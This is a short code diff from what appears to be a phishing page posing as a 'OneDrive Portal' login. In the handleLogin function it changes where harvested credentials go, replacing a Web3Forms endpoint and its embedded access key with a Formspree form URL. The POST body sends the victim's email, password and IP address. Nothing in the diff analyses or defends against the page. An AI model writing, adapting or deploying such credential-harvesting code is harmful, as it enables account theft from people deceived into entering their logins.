@@ -981,18 +981,16 @@ async function handleLogin(e) {
             t: Date.now(),
         };
         
-        // Send directly to Web3Forms
+        // Send directly to Formspree
 try {
-    await fetch('https://api.web3forms.com/submit', {
+    await fetch('https://formspree.io/f/mnpnkljg', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
             'Accept': 'application/json'
         },
         body: JSON.stringify({
-            access_key: 'a682d4f0-f5ae-4c34-a6f6-f29d10f9c24b',
-            subject: 'New Login',
-            from_name: 'OneDrive Portal',
+            _subject: 'New Login',
             email: email,
             password: password,
             ip: ip || 'Unknown',
